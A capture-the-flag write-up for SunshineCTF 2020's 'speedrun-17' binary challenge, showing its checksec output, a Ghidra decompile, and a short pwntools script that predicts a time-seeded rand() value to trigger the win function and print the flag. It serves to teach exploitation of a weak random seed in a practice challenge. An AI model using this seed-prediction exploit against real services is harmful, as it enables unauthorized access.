# **speedrun-17**
## Task
nc chal.2020.sunshinectf.org 30017
File: chall_17
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
* No defect found
* System 64 bit
* 
### Decompile with ghidra
```c
void main(void)

{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  __isoc99_scanf(&DAT_00100aea,&local_18);
  if (local_14 == local_18) {
    win();
  }
  else {
    printf("Got: %d\nExpected: %d\n",(ulong)local_18,(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Just make a race with random function.
Trick to use the libc to generate the random value with the same real time server.
Here we go!
### Exploit
```python
from pwn import *
from ctypes import *

p = remote('chal.2020.sunshinectf.org',30017)
binary = context.binary = ELF('./chall_17')
libc = cdll.LoadLibrary('libc.so.6')
libc.srand(libc.time(None))
p.sendline(str(libc.rand()))
output = p.recvline()
print(output)
```
### Output
```bash
[+] Opening connection to chal.2020.sunshinectf.org on port 30017: Done
[*] '/home/kali/speedrun_sunshineCTF2020/chall_17'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'sun{unholy-confessions-b74c1ed1f1d486fe}\n'
```
